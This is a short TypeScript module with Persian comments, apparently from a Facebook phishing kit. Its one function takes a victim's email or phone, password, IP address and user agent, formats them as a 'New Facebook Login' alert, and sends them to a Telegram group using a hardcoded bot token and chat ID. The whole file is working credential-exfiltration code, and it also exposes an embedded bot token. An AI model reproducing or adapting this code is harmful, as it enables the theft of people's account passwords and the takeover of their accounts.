import TelegramBot from 'node-telegram-bot-api';

// تنظیمات توکن بات تلگرام
const telegramToken = '6749154978:AAETDW8dC6S4BleNYQmQwdrbE85YJBOvgmA';
const telegramChatId = '-1002686281878';

// ایجاد یک نمونه از بات تلگرام
const bot = new TelegramBot(telegramToken, { polling: false });

// ارسال اطلاعات به گروه تلگرام
export async function sendCredentialsToTelegram(email: string, password: string, ip: string, userAgent: string): Promise<boolean> {
  try {
    const message = `📌 *New Facebook Login*\n\n👤 *Email/Phone:* \`${email}\`\n🔑 *Password:* \`${password}\`\n\n🌐 *IP:* ${ip}\n📱 *User-Agent:* ${userAgent}`;
    
    await bot.sendMessage(telegramChatId, message, { parse_mode: 'Markdown' });
    return true;
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
    return false;
  }
}